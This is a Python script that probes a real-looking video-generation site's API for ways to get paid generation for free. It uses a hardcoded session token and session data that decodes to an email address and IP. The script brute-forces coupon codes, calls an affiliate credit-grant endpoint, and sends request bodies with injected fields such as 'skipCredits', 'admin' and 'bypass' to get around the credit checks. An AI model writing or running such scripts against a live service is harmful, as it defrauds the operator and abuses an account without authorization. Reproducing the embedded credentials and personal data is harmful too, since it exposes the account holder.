import requests, json

BASE = 'https://viddo.ai'
SESSION_TOKEN = 'CiqAykZneKhsNT1S6iRNR75QS6Cj2n2X.g4pzFoA9Mql5aDBC3K+UuqgVTxeoOndb+eTAmGk1GKc='
SESSION_DATA = ('eyJzZXNzaW9uIjp7InNlc3Npb24iOnsiZXhwaXJlc0F0IjoiMjAyNi0wNS0wNVQwNjozNzo1OC41MjRaIiwidG9rZW4iOiJDaXFBeWtabmVLaHNOVDFTNmlSTlI3NVFTNkNqMm4yWCIsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMjhUMDY6Mzc6NTguNTI0WiIsInVwZGF0ZWRBdCI6IjIwMjYtMDQtMjhUMDY6Mzc6NTguNTI0WiIsImlwQWRkcmVzcyI6IjExMS45My4xMi4xNDIiLCJ1c2VyQWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxNTIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xNTIuMCIsInVzZXJJZCI6InNYWFZXQUthbWlJQjdlN001WDgzZG5TclRtcFJ1UXo4IiwiaWQiOiJTOVRQVFN4TWFFdUhKQTNmUzRURmJubHdDZmE3WW1hcyJ9LCJ1c2VyIjp7Im5hbWUiOiJhaHk0OEB0ZW1wZWR1bWFpbC5tZSIsImVtYWlsIjoiYWh5NDhAdGVtcGVkdW1haWwubWUiLCJlbWFpbFZlcmlmaWVkIjp0cnVlLCJpbWFnZSI6bnVsbCwiY3JlYXRlZEF0IjoiMjAyNi0wNC0wOFQwMjo1OTozNS4zNDRaIiwidXBkYXRlZEF0IjoiMjAyNi0wNC0wOFQwMjo1OTozNS4zNDRaIiwiaWQiOiJzWFhWV0FLYW1pSUI3ZTdNNVg4M2RuU3JUbXBSdVF6OCJ9LCJ1cGRhdGVkQXQiOjE3NzczNTg2MTExMzMsInZlcnNpb24iOiIxIn0sImV4cGlyZXNBdCI6MTc3NzM1ODkxMTEzMywic2lnbmF0dXJlIjoidy1vU3BkNG1UTXhMUl9wNHFNc3FVTVhWbkEzc2R5N1lteWNFb3BsT0VzdyJ9')
COOKIES = {'__Secure-better-auth.session_token': SESSION_TOKEN, '__Secure-better-auth.session_data': SESSION_DATA}
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0',
    'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5', 'Content-Type': 'application/json',
    'Referer': 'https://viddo.ai/dashboard', 'Origin': 'https://viddo.ai',
    'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin',
}

# 1. GET session — has credits field?
print('=== Session (full) ===')
r = requests.get(BASE + '/api/auth/get-session', headers=HEADERS, cookies=COOKIES, timeout=10)
print(json.dumps(r.json(), indent=2))

# 2. Try coupon endpoints to add credits
print('\n=== Coupon test ===')
for coupon in ['UNLIMITED', 'FREE', 'FREECREDITS', 'BETA', 'PROMO', 'SEEDANCE', 'VIDDO', '100FREE']:
    body = {'coupon': coupon}
    r2 = requests.post(BASE + '/api/coupon', headers=HEADERS, cookies=COOKIES, json=body, timeout=10)
    if r2.status_code != 404:
        print(f'  {coupon}: {r2.status_code}: {r2.text[:200]}')

# 3. referral/affiliate credit grant
print('\n=== Affiliate ===')
r3 = requests.post(BASE + '/api/affiliate', headers=HEADERS, cookies=COOKIES, json={}, timeout=10)
print(r3.status_code, r3.text[:500])

# 4. Try seedance with negative freeMode / different bypass params
print('\n=== Bypass variants ===')
test_bodies = [
    {'model': 'seedance-2-0', 'channel': 'version2', 'prompt': 'wolf', 'aspectRatio': '16:9', 'quality': '480p', 'duration': 5, 'webSearch': False, 'freeMode': True, 'skipCredits': True},
    {'model': 'seedance-2-0', 'channel': 'version2', 'prompt': 'wolf', 'aspectRatio': '16:9', 'quality': '480p', 'duration': 5, 'webSearch': False, 'freeMode': True, 'useCredits': False},
    {'model': 'seedance-2-0', 'channel': 'version2', 'prompt': 'wolf', 'aspectRatio': '16:9', 'quality': '480p', 'duration': 5, 'webSearch': False, 'freeMode': True, 'credits': 0},
    {'model': 'seedance-2-0', 'channel': 'version2', 'prompt': 'wolf', 'aspectRatio': '16:9', 'quality': '480p', 'duration': 5, 'webSearch': False, 'isFree': True},
    {'model': 'seedance-2-0', 'channel': 'version2', 'prompt': 'wolf', 'aspectRatio': '16:9', 'quality': '480p', 'duration': 5, 'webSearch': False, 'free': True},
    {'model': 'seedance-2-0', 'channel': 'version2', 'prompt': 'wolf', 'aspectRatio': '16:9', 'quality': '480p', 'duration': 5, 'webSearch': False, 'admin': True},
    {'model': 'seedance-2-0', 'channel': 'version2', 'prompt': 'wolf', 'aspectRatio': '16:9', 'quality': '480p', 'duration': 5, 'webSearch': False, 'bypass': True},
    {'model': 'seedance-2-0', 'channel': 'version2', 'prompt': 'wolf', 'aspectRatio': '16:9', 'quality': '480p', 'duration': 5, 'webSearch': False, 'override': True},
    {'model': 'seedance-2-0', 'channel': 'version2', 'prompt': 'wolf', 'aspectRatio': '16:9', 'quality': '480p', 'duration': 5, 'webSearch': False, 'priority': 'free'},
    {'model': 'seedance-2-0', 'channel': 'version2', 'prompt': 'wolf', 'aspectRatio': '16:9', 'quality': '480p', 'duration': 5, 'webSearch': False, 'channel': 'free'},
    {'model': 'seedance-2-0', 'channel': 'version2', 'prompt': 'wolf', 'aspectRatio': '16:9', 'quality': '480p', 'duration': 5, 'webSearch': False, 'channel': 'admin'},
    {'model': 'seedance-2-0', 'channel': 'version2', 'prompt': 'wolf', 'aspectRatio': '16:9', 'quality': '480p', 'duration': 5, 'webSearch': False, 'mode': 'free'},
]
for b in test_bodies:
    extra = {k: v for k, v in b.items() if k not in ['model','channel','prompt','aspectRatio','quality','duration','webSearch']}
    r4 = requests.post(BASE + '/api/middle-layer', headers=HEADERS, cookies=COOKIES, json=b, timeout=15)
    print(f'  {extra} → {r4.status_code}: {r4.text[:120]}')
